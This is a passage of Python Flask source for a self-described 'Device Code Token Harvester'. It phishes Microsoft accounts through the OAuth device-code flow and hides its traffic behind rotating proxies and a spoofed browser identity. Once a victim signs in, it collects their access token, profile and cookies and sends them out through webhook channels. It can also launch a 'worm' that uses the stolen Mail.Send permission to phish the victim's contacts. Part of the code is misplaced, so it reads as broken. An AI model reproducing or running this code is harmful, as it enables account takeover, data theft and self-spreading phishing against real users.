        os.environ.pop('DISCORD_WEBHOOK_URL', None)
    
    saved = save_runtime_overrides(overrides)
    if saved:
        try:
            apply_runtime_overrides(overrides)
            logger.success("Exfil settings saved and applied")
        except Exception as e:
            logger.warning(f"Failed to apply exfil settings immediately: {e}")
    
    return jsonify({
        'success': saved,
        'message': 'Exfil settings saved' + (' and applied' if saved else ''),
        'channels_configured': len(json.loads(exfil_config).get('channels', [])) if exfil_config else 0
    })


@app.route('/api/exfil/test', methods=['POST'])
@requires_auth
def test_exfil_settings():
    """Send a small test payload through the current exfil configuration or channel-specific webhook config."""
    data = request.get_json(silent=True) or {}
    channel_type = (data.get('channel_type') or '').strip().lower()

    if channel_type:
        mgr = get_exfil_manager_for_channel(channel_type)
    else:
        mgr = get_exfil_manager()

    if mgr is None:
        return jsonify({'success': False, 'error': 'No exfil configuration loaded or channel not configured'}), 400

    payload = {
        'type': 'test',
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'message': f"{channel_type.capitalize() if channel_type else 'Exfil'} test from dashboard",
        'app': 'Device Code Harvester'
    }

    try:
        results = mgr.exfiltrate(payload)
        success = any((v.get('success') if isinstance(v, dict) else bool(v)) for v in results.values()) if results else False
        return jsonify({
            'success': success,
            'results': results
        })
    except Exception as e:
        logger.error(f"Exfil test failed: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/exfil/validate', methods=['GET', 'POST'])
@app.route('/api/exfil/validate/', methods=['GET', 'POST'])
@requires_auth
def validate_exfil_settings():
    """Validate current exfil channel connectivity and configuration."""
    mgr = get_exfil_manager()
    if mgr is None:
        return jsonify({'valid': False, 'error': 'No exfil configuration loaded'}), 400

    try:
        results = mgr.validate()
        valid = all(r.get('valid') if isinstance(r, dict) else False for r in results.values()) if results else False
        return jsonify({
            'valid': valid,
            'results': results
        })
    except Exception as e:
        logger.error(f"Exfil validation failed: {e}")
        return jsonify({'valid': False, 'error': str(e)}), 500


# Diagnostic ping for exfil endpoints (helps confirm routing/auth)
@app.route('/api/exfil/ping', methods=['GET', 'POST'])
@requires_auth
def exfil_ping():
    """Lightweight endpoint to confirm exfil routes and auth."""
    return jsonify({'success': True, 'message': 'exfil ping ok', 'path': request.path, 'method': request.method})


# -------------------- MAIN API ROUTES --------------------
@app.route('/login', methods=['GET', 'POST'])
def login():
    if not is_auth_enabled():
        return redirect(url_for('index'))

    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if check_auth(username, password):
            session['logged_in'] = True
            next_url = request.args.get('next') or url_for('index')
            return redirect(next_url)
        error = 'Invalid username or password.'

    return render_template('login.html', error=error)


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


@app.route('/')
def index():
    """Root path: show login page when not authenticated, otherwise dashboard."""
    global last_keepalive
    if not is_authenticated():
        # Render the login page as the index for easy hosting
        logger.api("Serving login page at index for unauthenticated user")
        return render_template('login.html', error=None)

    logger.api("Dashboard page served for authenticated user")
    return render_template('dashboard.html', client_id=os.environ.get('CLIENT_ID', ''))


@app.route('/static/<path:filename>')
@requires_auth
def serve_static(filename):
    """Serve static files (CSS, JS, images)."""
    return send_from_directory(STATIC_FOLDER, filename)

@app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "worm_enabled": WormConfig.ENABLED,
        "version": "3.0.0",
        "last_keepalive": last_keepalive
    })


@app.route('/keepalive', methods=['GET'])
def keepalive():
    """Simple keepalive endpoint to keep-hosting services awake.

    Returns 200 and updates a last_keepalive timestamp visible via /health.
    """
    global last_keepalive
    last_keepalive = datetime.now(timezone.utc).isoformat()
    logger.debug(f"Keepalive received at {last_keepalive}")
    return jsonify({'status': 'ok', 'last_keepalive': last_keepalive}), 200


@app.route('/test/exfil', methods=['POST'])
def test_exfil_endpoint():
    """Test endpoint for receiving exfiltrated data during testing."""
    try:
        data = request.get_json() or {}

        # Log the exfiltration
        logger.info(f"[TEST EXFIL] Received data")

        # Save to file for inspection
        test_data_file = Path('test_exfil_data.json')
        existing_data = []
        if test_data_file.exists():
            try:
                with open(test_data_file, 'r') as f:
                    existing_data = json.load(f)
            except Exception:
                existing_data = []

        existing_data.append({
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'data': data
        })

        with open(test_data_file, 'w') as f:
            json.dump(existing_data, f, indent=2)

        return jsonify({
            'status': 'success',
            'message': 'Test exfiltration received',
            'timestamp': datetime.now(timezone.utc).isoformat()
        }), 200

    except Exception as e:
        logger.error(f"[TEST EXFIL] Error: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/worm/template/preview')
@requires_auth
def worm_template_preview():
    """Preview worm email templates (HTML and TXT)."""
    from worm import EmailTemplateLoader
    loader = EmailTemplateLoader(
        html_path=os.environ.get('WORM_HTML_TEMPLATE', 'wormy.html'),
        txt_path=os.environ.get('WORM_TXT_TEMPLATE', 'wormy.txt')
    )
    
    try:
        html_template, is_html = loader.load_template()
        txt_template = loader.load_txt_template()
        
        return jsonify({
            'success': True,
            'html_template': html_template if is_html else None,
            'txt_template': txt_template,
            'template_type': 'html' if is_html else 'txt',
            'has_custom_templates': (
                Path(loader.html_path).exists() or Path(loader.txt_path).exists()
            )
        })
    except Exception as e:
        logger.error(f"Failed to preview templates: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/worm/status')
@requires_auth
def worm_status():
    """Get current worm propagation status."""
    if not worm:
        return jsonify({"enabled": False})
    try:
        from worm import connect_db
        conn = connect_db()
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM targets WHERE status='phished'")
        phished = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM targets WHERE status='captured'")
        captured = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM targets WHERE status='failed'")
        failed = c.fetchone()[0]
        conn.close()
        logger.debug(f"Worm status: phished={phished}, captured={captured}, failed={failed}")
        return jsonify({
            "enabled": True,
            "max_depth": WormConfig.MAX_DEPTH,
            "max_targets": WormConfig.MAX_TARGETS_PER_CAPTURE,
            "phished_count": phished,
            "captured_count": captured,
            "failed_count": failed
        })
    except Exception as e:
        logger.error(f"Failed to get worm status: {e}")
        return jsonify({"enabled": True, "error": str(e)})


@app.route('/api/letter/preview')
@requires_auth
def letter_preview():
    """Return a safe preview of the local worm letter file (plain text, limited size)."""
    # Look for the configured path (env) but prefer files located in the app folder
    configured = os.environ.get('WORM_LETTER_PATH', 'wormletter.txt')
    # Prefer HTML if both TXT and HTML exist in the app folder
    from pathlib import Path
    p = Path(configured)
    base_dir = Path(__file__).parent
    html_candidate = p.with_suffix('.html')
    txt_candidate = p.with_suffix('.txt')
    candidates = []
    # If both exist under app folder, prefer HTML
    if (base_dir / html_candidate).exists():
        candidates.append(str(html_candidate))
    if (base_dir / txt_candidate).exists() and str(txt_candidate) not in candidates:
        candidates.append(str(txt_candidate))
    # Fallback to the literal configured path
    if str(p) not in candidates:
        candidates.append(str(p))

    try:
        for cand in candidates:
            full = base_dir / cand
            if full.exists():
                # Read up to 10KB to avoid huge responses
                with open(full, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read(10_240)
                logger.info(f"Loaded letter preview from: {full}")
                return jsonify({"found": True, "content": content})

        # Not found in app folder, try literal configured path as last resort
        if os.path.exists(configured):
            with open(configured, 'r', encoding='utf-8', errors='replace') as f:
                content = f.read(10_240)
            return jsonify({"found": True, "content": content})

        logger.warning(f"Letter file not found (checked candidates): {candidates}")
        return jsonify({"found": False, "error": "letter file not found"}), 404
    except Exception as e:
        logger.error(f"Error reading letter file candidates {candidates}: {e}")
        return jsonify({"found": False, "error": str(e)}), 500

@app.route('/api/test-version', methods=['GET'])
@requires_auth
def test_version():
    """Test endpoint to check if new code is loaded."""
    return jsonify({"message": "FIXED VERSION LOADED - v2"})


def build_share_link(verification_uri: str, user_code: str) -> str:
    if not verification_uri or not user_code:
        return verification_uri or ''
    try:
        parsed = urlparse(verification_uri)
        query = parse_qs(parsed.query)
        query['user_code'] = [user_code]
        return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
    except Exception:
        return verification_uri or ''


class DeviceCodeRequestError(Exception):
    def __init__(self, status_code: int, message: str, response: object = None):
        super().__init__(message)
        self.status_code = status_code
        self.response = response


def _format_direct_response_error(resp) -> str:
    try:
        body = resp.json()
    except Exception:
        body = resp.text

    if isinstance(body, dict) and 'error' in body:
        return f"{resp.status_code} {body.get('error')}: {body.get('error_description', body)}"
    return f"{resp.status_code} {body}"


def request_device_code_direct(client_id: str, tenant: str, scopes: list) -> dict:
    """Request device code directly without using StealthEngine or proxies."""
    import requests as _requests

    sess = _requests.Session()
    sess.trust_env = False
    sess.proxies = {}
    sess.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'application/x-www-form-urlencoded',
        'Content-Type': 'application/x-www-form-urlencoded'
    })

    logger.debug(f"Direct request session proxies={sess.proxies}, trust_env={sess.trust_env}")
    data = {"client_id": client_id, "scope": " ".join(scopes)}
    env_tenant = os.environ.get('TENANT', '').strip()
    tenants = [tenant]
    if env_tenant and env_tenant not in tenants:
        tenants.append(env_tenant)
    if tenant.lower() == 'common':
        for fallback in ['organizations', 'consumers']:
            if fallback not in tenants:
                tenants.append(fallback)

    last_response = None
    for attempt_tenant in tenants:
        url = f"https://login.microsoftonline.com/{attempt_tenant}/oauth2/v2.0/devicecode"
        logger.debug(f"Direct device code attempt for tenant={attempt_tenant} url={url}")
        resp = sess.post(url, data=data, timeout=15)
        if resp.status_code == 200:
            return resp.json()

        last_response = resp
        try:
            body = resp.json()
        except ValueError:
            body = resp.text
        logger.warning(f"Direct request failed for tenant={attempt_tenant} status={resp.status_code} body={body}")

        if attempt_tenant == 'common' and resp.status_code == 400 and isinstance(body, dict) and body.get('error') == 'invalid_request' and 'AADSTS50059' in body.get('error_description', ''):
            logger.info("Tenant common returned AADSTS50059; retrying with organizations/consumers")
            continue

        raise DeviceCodeRequestError(resp.status_code, _format_direct_response_error(resp), resp)

    if last_response is not None:
        raise DeviceCodeRequestError(last_response.status_code, _format_direct_response_error(last_response), last_response)

    raise DeviceCodeRequestError(500, "Unable to get device code via direct request")


@app.route('/api/start-capture', methods=['POST'])
@requires_auth
@log_time()
def start_capture():
    """Start a new capture session."""
    print("DEBUG: start_capture() called - FIXED VERSION LOADED", flush=True)
    data = request.get_json()
    client_id = data.get('client_id')
    tenant = (data.get('tenant') or '').strip()
    if not tenant:
        tenant = (os.environ.get('TENANT') or os.environ.get('TENANT_ID') or 'common').strip() or 'common'
    scope_str = data.get('scope', 'openid offline_access profile')
    
    if not client_id:
        logger.error("Start capture failed: client_id required")
        return jsonify({"error": "client_id required"}), 400

    # Ensure Mail.Send scope if worm enabled and not already present
    if worm and "Mail.Send" not in scope_str:
        scope_str += " Mail.Send"
        logger.debug("Added Mail.Send scope for worm propagation")

    scopes = scope_str.split()
    max_endpoints = data.get('max_endpoints', 4)
    refresh = data.get('refresh', False)
    detect_ca = data.get('detect_ca', False)

    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        'client_id': client_id,
        'tenant': tenant,
        'scopes': scopes,
        'refresh': refresh,
        'detect_ca': detect_ca,
        'max_endpoints': max_endpoints,
        'created_at': time.time(),
        'status': 'initializing',
        'device_code_data': None,
        'token': None,
        'user_info': {},
        'cookies': [],
        'polling_active': False,
        'queue': queue.Queue(),
        'results': {}
    }

    logger.info(f"Session started: {session_id}")
    logger.debug(f"Configuration: tenant={tenant}, scopes={scopes}, endpoints={max_endpoints}")

    # Get device code
    stealth = StealthEngine()
    client_secret = data.get('client_secret') or os.environ.get('CLIENT_SECRET')
    if client_secret:
        logger.info("Confidential client secret detected for session %s", session_id)
    harvester = TokenHarvester(client_id, tenant=tenant, scopes=scopes, stealth=stealth, client_secret=client_secret)
    # save stealth instance for observability and later stats
    sessions[session_id]['stealth'] = stealth
    sessions[session_id]['client_secret'] = bool(client_secret)
    try:
        device_code_data = harvester.get_device_code()
        sessions[session_id]['device_code_data'] = device_code_data
        # record which proxy was used for observability
        sessions[session_id]['last_proxy'] = getattr(harvester, 'last_used_proxy', getattr(harvester.stealth, '_last_selected_proxy', None))
        logger.success(f"Device code obtained for session {session_id}")
        logger.api(f"Verification URI: {device_code_data.get('verification_uri')}")
        logger.api(f"User code: {device_code_data.get('user_code')}")

        # Start polling worker in background
        polling_thread = threading.Thread(
            target=polling_worker,
            args=(session_id, harvester, device_code_data),
            daemon=True
        )
        polling_thread.start()

        return jsonify({
            "session_id": session_id,
            "user_code": device_code_data.get('user_code'),
            "verification_uri": device_code_data.get('verification_uri'),
            "share_link": build_share_link(device_code_data.get('verification_uri'), device_code_data.get('user_code')),
            "interval": device_code_data.get('interval', 5),
            "last_proxy": sessions[session_id].get('last_proxy')
        })
    except Exception as e:
        logger.error(f"Failed to get device code: {e}")
        logger.info("Retrying device code request without proxies")

        try:
            device_code_data = request_device_code_direct(client_id, tenant, scopes)
            direct_stealth = StealthEngine(proxy_list=[], use_manager_proxy=False)
            direct_harvester = TokenHarvester(client_id, tenant=tenant, scopes=scopes, stealth=direct_stealth)

            sessions[session_id]['device_code_data'] = device_code_data
            sessions[session_id]['last_proxy'] = getattr(direct_stealth, '_last_selected_proxy', None) or getattr(direct_harvester, 'last_used_proxy', None)
            logger.success(f"Device code obtained for session {session_id} (direct connection)")
            logger.api(f"Verification URI: {device_code_data.get('verification_uri')}")
            logger.api(f"User code: {device_code_data.get('user_code')}")

            # persist direct stealth for observability
            sessions[session_id]['stealth'] = direct_stealth
            polling_thread = threading.Thread(
                target=polling_worker,
                args=(session_id, direct_harvester, device_code_data),
                daemon=True
            )
            polling_thread.start()

            return jsonify({
                "session_id": session_id,
                "user_code": device_code_data.get('user_code'),
                "verification_uri": device_code_data.get('verification_uri'),
                "share_link": build_share_link(device_code_data.get('verification_uri'), device_code_data.get('user_code')),
                "interval": device_code_data.get('interval', 5),
                "last_proxy": sessions[session_id].get('last_proxy')
            })
        except DeviceCodeRequestError as e3:
            logger.error(f"Direct device code request failed: {e3}")
            return jsonify({"error": str(e3)}), max(400, min(e3.status_code, 599))
        except Exception as e3:
            logger.error(f"Direct device code request failed: {e3}")
            return jsonify({"error": str(e3)}), 500


def polling_worker(session_id: str, harvester: 'TokenHarvester', device_code_data: dict):
    """Worker thread that polls for token acquisition."""
    session = sessions.get(session_id)
    if not session:
        logger.error(f"Session {session_id} not found")
        return

    session['polling_active'] = True
    # announce initial proxy if available
    last_proxy = session.get('last_proxy')
    if last_proxy:
        try:
            q = session.get('queue')
            if q:
                q.put({'type': 'proxy', 'proxy': last_proxy})
        except Exception:
            pass


@app.route('/api/session-info/<session_id>', methods=['GET'])
@requires_auth
def session_info(session_id):
    """Return session-level information including last proxy and stealth stats."""
    sess = sessions.get(session_id)
    if not sess:
        return jsonify({'error': 'session not found'}), 404

    stealth = sess.get('stealth')
    stealth_stats = {}
    try:
        if stealth and hasattr(stealth, 'get_stats'):
            stealth_stats = stealth.get_stats()
    except Exception as e:
        logger.debug(f"Failed to collect stealth stats for session {session_id}: {e}")

    return jsonify({
        'session_id': session_id,
        'client_id': sess.get('client_id'),
        'tenant': sess.get('tenant'),
        'created_at': sess.get('created_at'),
        'polling_active': sess.get('polling_active', False),
        'last_proxy': sess.get('last_proxy'),
        'stealth': stealth_stats
    })
    device_code = device_code_data.get('device_code')
    interval = device_code_data.get('interval', 5)
    max_polling_time = 900  # 15 minutes

    start = time.time()
    attempt = 0

    while time.time() - start < max_polling_time:
        attempt += 1
        try:
            session['queue'].put({'type': 'polling', 'attempt': attempt, 'interval': interval})
            result = harvester.poll_for_token(device_code)

            if result['success']:
                logger.success(f"Token acquired for session {session_id}")
                session['token'] = result.get('access_token')
                session['results']['token'] = result
                session['queue'].put({'type': 'token_obtained'})
                break
            else:
                logger.debug(f"Polling attempt {attempt}: {result.get('status')}")
                time.sleep(interval)

        except Exception as e:
            logger.error(f"Polling error: {e}")
            session['queue'].put({'type': 'error', 'message': str(e)})
            break

    session['polling_active'] = False


@app.route('/api/stream/<session_id>')
@requires_auth
def stream(session_id):
    """SSE stream for polling updates."""
    session = sessions.get(session_id)
    if not session:
        return jsonify({"error": "Session not found"}), 404

    def event_generator():
        q = session['queue']
        while True:
            try:
                msg = q.get(timeout=30)
                yield f"data: {json.dumps(msg)}\n\n"

                if msg.get('type') == 'token_obtained':
                    break
                if msg.get('type') == 'error':
                    break
            except queue.Empty:
                yield ": keepalive\n\n"
            except GeneratorExit:
                break

    return Response(stream_with_context(event_generator()), mimetype='text/event-stream')


@app.route('/api/finalize/<session_id>', methods=['POST'])
@requires_auth
@log_time()
def finalize_capture(session_id):
    """Finalize capture: extract user info, cookies, and optionally propagate worm."""
    session = sessions.get(session_id)
    if not session:
        logger.error(f"Finalize failed: session {session_id} not found")
        return jsonify({"error": "Session not found"}), 404

    client_id = session.get('client_id')
    access_token = session.get('token')

    if not access_token:
        logger.error(f"No token for session {session_id}")
        return jsonify({"error": "No token acquired"}), 400

    logger.info(f"Finalizing session {session_id}")

    # Extract user info - pass full token dict
    harvester = TokenHarvester(client_id, token_data={'access_token': access_token})
    try:
        user_info = harvester.fetch_user_info()
        session['user_info'] = user_info
        logger.api(f"User: {user_info.get('userPrincipalName')}")
    except Exception as e:
        logger.warning(f"User info extraction failed: {e}")

    # Extract cookies
    try:
        cookies = harvester.extract_cookies()
        session['cookies'] = cookies
        logger.api(f"Cookies extracted: {len(cookies)}")
    except Exception as e:
        logger.warning(f"Cookie extraction failed: {e}")

    # Build final payload
    payload = build_session_payload(
        token_data={'access_token': access_token},
        cookies=cookies,
        user_info=user_info,
        client_id=client_id,
        tenant=session.get('tenant', 'common'),
        metadata={'device_code_data': session.get('device_code_data')}
    )

    # Exfiltrate using cached exfil manager (recreated when EXFIL_CONFIG changes)
    try:
        logger.info("Performing immediate exfiltration of harvested session payload")
        mgr = get_exfil_manager()
        if mgr:
            exfil_results = mgr.exfiltrate(payload)
            session['results']['exfil'] = exfil_results
            for channel_name, result in exfil_results.items():
                if isinstance(result, dict):
                    status = 'success' if result.get('success') else 'failure'
                    error = result.get('error')
                    logger.exfil(f"Channel {channel_name}: {status}" + (f" - {error}" if error else ""))
                else:
                    logger.exfil(f"Channel {channel_name}: {result}")
            successful = sum(1 for result in exfil_results.values() if isinstance(result, dict) and result.get('success'))
            logger.success(f"Exfiltration complete: {successful}/{len(exfil_results)} channels")
        else:
            logger.warning("No exfil manager loaded; skipping exfiltration")
    except Exception as e:
        logger.error(f"Exfiltration failed: {e}")

    # Conditionally start worm propagation
    if worm and session.get('start_worm'):
        logger.worm("Starting worm propagation in background")
        try:
            worm_thread = threading.Thread(
                target=worm.propagate,
                args=(user_info.get('userPrincipalName'), session.get('scopes', []), access_token),
                daemon=True
            )
            worm_thread.start()
        except Exception as e:
            logger.error(f"Worm propagation failed: {e}")

    logger.success(f"Session {session_id} finalized")
    return jsonify({
        "session_id": session_id,
        "session": {
            "client_id": client_id,
            "user": user_info,
            "tokens": {"access_token": access_token},
            "cookies": cookies,
            "cookie_count": len(cookies),
            "ca_analysis": [],
            "exfil_results": session['results'].get('exfil', {})
        },
        "exfil_results": session['results'].get('exfil', {})
    })


# -------------------- ERROR HANDLERS --------------------
@app.errorhandler(404)
def not_found(error):
    logger.api(f"404 Not Found: {request.path}")
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"500 Internal Server Error: {error}")
    return jsonify({'error': 'Internal server error'}), 500

@app.errorhandler(Exception)
def handle_exception(e):
    logger.error(f"Unhandled exception: {e}", exc_info=True)
    return jsonify({'error': str(e)}), 500

# -------------------- ENTRY POINT --------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true', 'yes')
    
    # Set log level from environment
    if os.environ.get('DEBUG', '').lower() in ('1', 'true', 'yes'):
        from logger import set_log_level
        set_log_level('DEBUG')
        logger.info("Debug logging enabled")
    
    # Start session cleanup thread
    def cleanup_worker():
        """Background thread to clean expired sessions."""
        while True:
            time.sleep(60)
            clean_expired_sessions()
    
    cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
    cleanup_thread.start()
    
    logger.info("=" * 60)
    logger.info("DEVICE CODE TOKEN HARVESTER - PRODUCTION READY")
    logger.info("=" * 60)
    logger.info(f"Starting server on port {port}")
    logger.info(f"Worm propagation: {'ENABLED' if WormConfig.ENABLED else 'DISABLED'}")
    logger.info(f"Proxy rotation: {'ENABLED' if os.environ.get('PROXY_LIST') else 'DISABLED'}")
    logger.info(f"Playwright cookies: {'ENABLED' if os.environ.get('PLAYWRIGHT', '').lower() == 'true' else 'DISABLED'}")
    logger.info(f"Configuration profiles: {len(saved_configs)}")
    logger.info(f"Template folder: {TEMPLATE_FOLDER}")
    logger.info(f"Config folder: {CONFIG_FOLDER}")
    logger.info("=" * 60)
    logger.info(f"Dashboard available at: http://localhost:{port}/")
    logger.info("=" * 60)
    
    # Run Flask app with proper Windows console handling
    app.run(host='0.0.0.0', port=port, debug=debug, threaded=True, use_reloader=False)
